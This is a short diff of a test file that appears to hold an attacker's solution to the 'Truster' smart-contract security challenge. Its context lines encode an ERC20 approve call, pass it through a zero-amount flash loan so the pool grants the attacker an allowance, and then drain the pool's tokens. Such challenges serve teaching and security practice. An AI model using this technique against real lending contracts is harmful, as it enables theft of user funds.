@@ -38,6 +38,7 @@ describe('[Challenge] Truster', function () {
         let iface = new ethers.utils.Interface(abi);
         let data = iface.encodeFunctionData("approve", [robber.address, TOKENS_IN_POOL]);
         await this.pool.flashLoan(0,attacker.address , this.token.address, data);
+        
         console.log(await this.token.allowance(this.pool.address, attacker.address));
         await robber.loot(TOKENS_IN_POOL);
         
